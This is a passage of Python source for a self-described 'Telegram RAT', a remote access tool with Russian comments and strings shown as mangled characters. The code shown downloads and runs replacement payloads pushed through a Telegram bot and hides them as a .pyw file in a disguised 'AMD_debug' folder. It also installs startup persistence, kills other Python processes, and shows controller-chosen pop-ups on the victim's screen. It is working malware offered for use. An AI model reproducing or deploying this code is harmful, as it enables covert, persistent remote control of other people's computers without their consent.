        bot.send_message(message.chat.id, 'üîÑ –ù–∞—á–∏–Ω–∞—é –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ...')
        
        # –°–∫–∞—á–∏–≤–∞–µ–º –Ω–æ–≤—ã–π —Ñ–∞–π–ª
        file_info = bot.get_file(message.document.file_id)
        if not file_info.file_path:
            bot.send_message(message.chat.id, '‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É.')
            return
        
        downloaded_file = bot.download_file(file_info.file_path)
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–≤—ã–π —Ñ–∞–π–ª –≤ AMD_debug
        new_file_path = os.path.join(AMD_DEBUG_PATH, "aganee.pyw")
        
        with open(new_file_path, 'wb') as f:
            f.write(downloaded_file)
        
        bot.send_message(message.chat.id, f'‚úÖ –ù–æ–≤—ã–π —Ñ–∞–π–ª —Å–æ—Ö—Ä–∞–Ω–µ–Ω: {new_file_path}')
        
        # –û–±–Ω–æ–≤–ª—è–µ–º –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫
        cleanup_startup_links()
        create_startup_link(new_file_path)
        
        bot.send_message(message.chat.id, '‚úÖ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ! –ù–æ–≤—ã–π –±–æ—Ç –±—É–¥–µ—Ç –∑–∞–ø—É—â–µ–Ω –ø—Ä–∏ —Å–ª–µ–¥—É—é—â–µ–π –∑–∞–≥—Ä—É–∑–∫–µ —Å–∏—Å—Ç–µ–º—ã.')
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –Ω–æ–≤—ã–π —Ñ–∞–π–ª
        try:
            subprocess.Popen([sys.executable, new_file_path])
            bot.send_message(message.chat.id, 'üöÄ –ù–æ–≤—ã–π –±–æ—Ç –∑–∞–ø—É—â–µ–Ω!')
        except Exception as e:
            bot.send_message(message.chat.id, f'‚ö†Ô∏è –ù–æ–≤—ã–π —Ñ–∞–π–ª —Å–æ—Ö—Ä–∞–Ω–µ–Ω, –Ω–æ –Ω–µ —É–¥–∞–ª–æ—Å—å –µ–≥–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å: {e}')
        
    except Exception as e:
        bot.send_message(message.chat.id, f'‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏: {str(e)}')

def popup_show_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    
    text = message.text.strip()
    if not text:
        bot.send_message(message.chat.id, '‚ùå –¢–µ–∫—Å—Ç –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º.')
        return
    
    bot.send_message(message.chat.id, f'üí¨ –ü–æ–∫–∞–∑—ã–≤–∞—é popup: "{text}"')
    
    try:
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º Windows API –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è popup –æ–∫–Ω–∞
        import ctypes
        from ctypes import wintypes
        
        # –≠–∫—Ä–∞–Ω–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç –¥–ª—è Windows API
        safe_text = text.replace('"', '\\"').replace('\n', '\\n')
        
        # –°–æ–∑–¥–∞–µ–º popup —á–µ—Ä–µ–∑ MessageBoxW —Å –∫–Ω–æ–ø–∫–∞–º–∏ –î–∞/–ù–µ—Ç –∏ topmost
        result = ctypes.windll.user32.MessageBoxW(
            0,  # hWnd (—Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–µ –æ–∫–Ω–æ)
            safe_text,  # lpText (—Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è)
            "–°–æ–æ–±—â–µ–Ω–∏–µ",  # lpCaption (–∑–∞–≥–æ–ª–æ–≤–æ–∫)
            0x24 | 0x1000  # uType (MB_ICONQUESTION | MB_YESNO | MB_TOPMOST)
        )
        
        if result == 6:  # IDYES
            bot.send_message(message.chat.id, '‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã–±—Ä–∞–ª: –î–ê')
        elif result == 7:  # IDNO
            bot.send_message(message.chat.id, '‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã–±—Ä–∞–ª: –ù–ï–¢')
        elif result == 0:  # –û—à–∏–±–∫–∞
            bot.send_message(message.chat.id, '‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–∫–∞–∑–∞—Ç—å popup —Å–æ–æ–±—â–µ–Ω–∏–µ.')
        else:
            bot.send_message(message.chat.id, f'‚úÖ Popup –ø–æ–∫–∞–∑–∞–Ω, —Ä–µ–∑—É–ª—å—Ç–∞—Ç: {result}')
        
    except Exception as e:
        # –ï—Å–ª–∏ Windows API –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –ø—Ä–æ–±—É–µ–º —á–µ—Ä–µ–∑ PowerShell
        try:
            # –≠–∫—Ä–∞–Ω–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç –¥–ª—è PowerShell
            ps_text = text.replace('"', '`"').replace("'", "''")
            
            # –°–æ–∑–¥–∞–µ–º PowerShell –∫–æ–º–∞–Ω–¥—É —Å –∫–Ω–æ–ø–∫–∞–º–∏ –î–∞/–ù–µ—Ç
            ps_command = f'''
Add-Type -AssemblyName System.Windows.Forms
$result = [System.Windows.Forms.MessageBox]::Show("{ps_text}", "–°–æ–æ–±—â–µ–Ω–∏–µ", "YesNo", "Question", "DefaultButton1", "TopMost")
if ($result -eq "Yes") {{ Write-Output "YES" }} else {{ Write-Output "NO" }}
'''
            
            # –ó–∞–ø—É—Å–∫–∞–µ–º PowerShell
            result = subprocess.run([
                'powershell', '-Command', ps_command
            ], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                output = result.stdout.strip()
                if output == "YES":
                    bot.send_message(message.chat.id, '‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã–±—Ä–∞–ª: –î–ê')
                elif output == "NO":
                    bot.send_message(message.chat.id, '‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã–±—Ä–∞–ª: –ù–ï–¢')
                else:
                    bot.send_message(message.chat.id, f'‚úÖ Popup –ø–æ–∫–∞–∑–∞–Ω, —Ä–µ–∑—É–ª—å—Ç–∞—Ç: {output}')
            else:
                bot.send_message(message.chat.id, f'‚ùå –û—à–∏–±–∫–∞ PowerShell: {result.stderr}')
                
        except Exception as e2:
            bot.send_message(message.chat.id, f'‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–∫–∞–∑–µ popup: {str(e2)}')

@bot.callback_query_handler(func=lambda call: call.data == 'popup:cancel')
def popup_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'update:cancel')
def update_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

def start_bot_with_reconnect():
    """–ó–∞–ø—É—Å–∫–∞–µ—Ç –±–æ—Ç–∞ —Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–º –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ–º"""
    retry_delay = 5
    
    while True:
        try:
            print("ü§ñ –ó–∞–ø—É—Å–∫–∞–µ–º Telegram –±–æ—Ç–∞...")
            bot.polling(none_stop=True, timeout=20, long_polling_timeout=20)
        except Exception as e:
            error_msg = str(e).lower()
            print(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: {e}")
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–∏–ø –æ—à–∏–±–∫–∏
            if 'network' in error_msg or 'connection' in error_msg or 'timeout' in error_msg:
                print("üåê –ü—Ä–æ–±–ª–µ–º–∞ —Å —Å–µ—Ç—å—é, –∂–¥–µ–º –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è...")
                wait_for_internet()
                retry_delay = 5  # –°–±—Ä–∞—Å—ã–≤–∞–µ–º –∑–∞–¥–µ—Ä–∂–∫—É –ø–æ—Å–ª–µ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è —Å–µ—Ç–∏
            else:
                print(f"üîÑ –ü–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —á–µ—Ä–µ–∑ {retry_delay} —Å–µ–∫—É–Ω–¥...")
                time.sleep(retry_delay)
                retry_delay = min(retry_delay * 1.5, 60)  # –º–∞–∫—Å–∏–º—É–º 60 —Å–µ–∫—É–Ω–¥

def check_internet_connection():
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –∏–Ω—Ç–µ—Ä–Ω–µ—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ"""
    try:
        import urllib.request
        urllib.request.urlopen('http://google.com', timeout=5)
        return True
    except:
        return False

def check_bot_token():
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å —Ç–æ–∫–µ–Ω–∞ –±–æ—Ç–∞"""
    try:
        bot.get_me()
        return True
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Ç–æ–∫–µ–Ω–∞ –±–æ—Ç–∞: {e}")
        return False

def wait_for_internet():
    """–ñ–¥–µ—Ç –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è –∏–Ω—Ç–µ—Ä–Ω–µ—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è"""
    print("üåê –û–∂–∏–¥–∞–Ω–∏–µ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è –∏–Ω—Ç–µ—Ä–Ω–µ—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è...")
    while not check_internet_connection():
        time.sleep(5)
    print("‚úÖ –ò–Ω—Ç–µ—Ä–Ω–µ—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ!")

if __name__ == '__main__':
    print("üöÄ –ó–∞–ø—É—Å–∫ Telegram RAT...")
    
    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º Qt –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
    print("üîî –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º—ã —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π...")
    init_qt_app()
    
    # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –¥—Ä—É–≥–∏–µ Python –ø—Ä–æ—Ü–µ—Å—Å—ã
    print("üîÑ –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –¥—Ä—É–≥–∏—Ö Python –ø—Ä–æ—Ü–µ—Å—Å–æ–≤...")
    kill_other_python_processes()
    
    # –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º AMD_debug –ø–∞–ø–∫—É –∏ –ø–µ—Ä–µ–º–µ—â–∞–µ–º —Å–∫—Ä–∏–ø—Ç
    print("üìÅ –ù–∞—Å—Ç—Ä–æ–π–∫–∞ AMD_debug...")
    script_path = setup_amd_debug_folder()
    
    # –û—á–∏—â–∞–µ–º —Å—Ç–∞—Ä—ã–µ —Å—Å—ã–ª–∫–∏ –∏ —Å–æ–∑–¥–∞–µ–º –Ω–æ–≤—É—é
    print("üîó –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞...")
    cleanup_startup_links(allowed_script_path=script_path)
    create_startup_link(script_path)
    
    # –ñ–¥–µ–º –∏–Ω—Ç–µ—Ä–Ω–µ—Ç –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º
    if not check_internet_connection():
        wait_for_internet()
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–æ–∫–µ–Ω –±–æ—Ç–∞
    if not check_bot_token():
        print("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ç–æ–∫–µ–Ω –±–æ—Ç–∞! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ API_TOKEN")
        input("–ù–∞–∂–º–∏—Ç–µ Enter –¥–ª—è –≤—ã—Ö–æ–¥–∞...")
        sys.exit(1)
    
    print("‚úÖ –¢–æ–∫–µ–Ω –±–æ—Ç–∞ –≤–∞–ª–∏–¥–µ–Ω")
    
    # –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ—Ç–∫–ª—é—á–µ–Ω—ã –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞ —Å –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ–º
    start_bot_with_reconnect()
